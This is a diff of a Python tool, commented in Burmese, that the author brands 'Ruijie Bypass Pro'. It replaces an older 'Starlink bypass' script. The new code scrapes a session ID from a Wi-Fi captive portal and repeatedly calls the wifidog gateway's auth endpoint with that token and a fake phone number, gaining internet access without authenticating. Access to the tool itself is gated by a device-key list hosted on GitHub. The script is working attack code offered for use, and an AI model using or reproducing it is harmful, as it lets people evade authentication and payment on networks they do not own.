@@ -1,70 +1,178 @@
 import os
 import requests
-import sys
+import re
 import urllib3
 import time
-import subprocess
-import hashlib
+import threading
+import logging
+import random
+import uuid
+import sys
+from urllib.parse import urlparse, parse_qs, urljoin
+from colorama import Fore, Back, Style, init
 
-# SSL Warning များ ပိတ်ထားခြင်း
+# SSL Warning ပိတ်ခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=True)
 
-KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
-CACHE_FILE = ".access_granted"
+# ===============================
+# LICENSE CONFIG (သင့်ရဲ့ Link နဲ့ ပြင်ဆင်ပြီး)
+# ===============================
+GITHUB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
+KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")
 
-def get_device_id():
+# ===============================
+# BYPASS CONFIG
+# ===============================
+PING_THREADS = 5
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
+DEBUG = False
+
+stop_event = threading.Event()
+
+# ===============================
+# SYSTEM FUNCTIONS
+# ===============================
+def get_or_create_key():
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "r") as f:
+            return f.read().strip()
+    else:
+        new_key = str(uuid.uuid4())[:12].upper()
+        with open(KEY_FILE, "w") as f:
+            f.write(new_key)
+        return new_key
+
+def check_real_internet():
     try:
-        host_info = os.uname().nodename + os.getlogin()
+        # Google အစား ပိုမြန်တဲ့ Cloudflare DNS ကို စစ်ကြည့်ပါမယ်
+        return requests.get("http://1.1.1.1", timeout=3).status_code == 200
     except:
-        host_info = "ST-ULTRA-V7"
-    return "TRB-" + hashlib.md5(host_info.encode()).hexdigest()[:10].upper()
+        return False
 
-def start_instant_bypass():
-    print("\n" + "="*40)
-    print("      STARLINK INSTANT BYPASS ACTIVE      ")
-    print("="*40)
-    print("[*] Connecting to Starlink Terminal...")
-    
-    # DNS Tunneling & Keep Alive စနစ်
+def h_banner():
+    os.system('clear')
+    print(f"{Fore.MAGENTA}{'='*55}")
+    print(f"{Fore.CYAN}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
+    print(f"{Fore.CYAN} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
+    print(f"{Fore.CYAN} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
+    print(f"{Fore.CYAN} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
+    print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
+    print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
+    print(f"{Fore.MAGENTA}{'='*55}")
+    print(f"{Fore.WHITE}{Back.RED}      MY RUIJIE BYPASS PRO | OWNER: {Fore.YELLOW}HH TET TET      ")
+    print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")
+
+# ===============================
+# BYPASS CORE LOGIC
+# ===============================
+def high_speed_ping(auth_link, sid):
+    session = requests.Session()
+    while not stop_event.is_set():
+        try:
+            session.get(auth_link, timeout=5)
+            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID {sid} | Pulse Active...           ", end="\r")
+        except:
+            print(f"{Fore.RED}[X]{Fore.RESET} Connection Lost...               ", end="\r")
+            break
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+
+def start_bypass_process():
+    logging.info(f"{Fore.CYAN}Initializing Engine...{Fore.RESET}")
+
+    while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Active... Ready        ", end="\r")
+                    time.sleep(5)
+                    continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+
+            print(f"\n{Fore.CYAN}[*] Captive Portal Detected{Fore.RESET}")
+
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if not sid:
+                time.sleep(5)
+                continue
+
+            print(f"{Fore.GREEN}[✓]{Fore.RESET} Session ID: {sid}")
+
+            params = parse_qs(parsed_portal.query)
+            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+            gw_port = params.get('gw_port', ['2060'])[0]
+
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+            print(f"{Fore.MAGENTA}[*] Launching {PING_THREADS} Threads...{Fore.RESET}")
+
+            for _ in range(PING_THREADS):
+                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+
+            while check_real_internet():
+                time.sleep(5)
+
+        except Exception as e:
+            time.sleep(5)
+
+# ===============================
+# LICENSE VERIFICATION
+# ===============================
+def verify_license():
+    h_banner()
+    user_key = get_or_create_key()
+    print(f"{Fore.YELLOW}[i] Checking security clearance...")
+    print(f"{Fore.WHITE}└─ Your Device ID: {Fore.GREEN}{user_key}")
+    print(f"{Fore.CYAN}{'─'*55}")
+
     try:
-        while True:
-            # Starlink Portal ကို ကျော်ရန် Google Connectivity Check ကို သုံးခြင်း
-            requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
-            print("[✔] STATUS: BYPASS SUCCESSFUL!")
-            print("[i] အင်တာနက် အသုံးပြုနိုင်ပါပြီ။ Tool ကို မပိတ်ပါနဲ့။")
-            time.sleep(10)
-    except:
-        print("[!] လိုင်းတစ်ချက် ပြတ်သွားသည်။ ပြန်ချိတ်နေပါသည်...")
-        time.sleep(2)
-        start_instant_bypass()
+        response = requests.get(GITHUB_URL, timeout=10)
+        if response.status_code == 200:
+            lines = response.text.splitlines()
+            for line in lines:
+                if "|" in line:
+                    key, status = line.split("|")
+                    if key.strip() == user_key:
+                        if status.strip().upper() == "ACTIVE":
+                            print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
+                            print(f"{Fore.GREEN}✅ Access Granted! Launching...")
+                            time.sleep(1)
+                            return True
+                        else:
+                            print(f"{Fore.RED}[!] Status: {Fore.BLACK}{Back.RED} BANNED ")
+                            sys.exit()
+            
+            print(f"{Fore.RED}❌ ERROR: DEVICE ID NOT REGISTERED")
+            print(f"{Fore.YELLOW}Please add [{user_key}|ACTIVE] to your key.txt on GitHub.")
+            sys.exit()
+    except Exception as e:
+        print(f"{Fore.RED}❌ ERROR: CANNOT CONNECT TO SERVER")
+        sys.exit()
 
-def check_key():
-    device_id = get_device_id()
-    print(f"\n[+] YOUR DEVICE ID: {device_id}")
-    
-    # ၁။ အင်တာနက်ရှိရင် GitHub က Key ကို အရင်စစ်မယ်
-    try:
-        response = requests.get(KEY_URL, verify=False, timeout=5)
-        if device_id in response.text:
-            # Key မှန်ရင် ဖုန်းထဲမှာ မှတ်တမ်း (Cache) သိမ်းမယ်
-            with open(CACHE_FILE, "w") as f:
-                f.write(device_id)
-            print("[+] Access Granted! (Online Verified)")
-            start_instant_bypass()
-            return
-    except:
-        # ၂။ အင်တာနက်မရှိရင် ဖုန်းထဲက မှတ်တမ်းဟောင်းကို စစ်မယ်
-        if os.path.exists(CACHE_FILE):
-            with open(CACHE_FILE, "r") as f:
-                if f.read().strip() == device_id:
-                    print("[+] Access Granted! (Offline Mode - Cached)")
-                    start_instant_bypass()
-                    return
-
-    # ၃။ နှစ်ခုလုံးမရှိရင် Access Denied ပြမယ်
-    print("[-] Access Denied! Key မရှိသေးပါ။")
-    print("[!] ပထမဆုံးအကြိမ်အတွက် Mobile Data/VPN ဖြင့် Key အရင်စစ်ပေးပါ။")
-    sys.exit()
-
+# ===============================
+# ENTRY POINT
+# ===============================
 if __name__ == "__main__":
-    check_key()
+    try:
+        if verify_license():
+            start_bypass_process()
+    except KeyboardInterrupt:
+        stop_event.set()
+        print(f"\n{Fore.RED}Program Stopped...{Fore.RESET}")
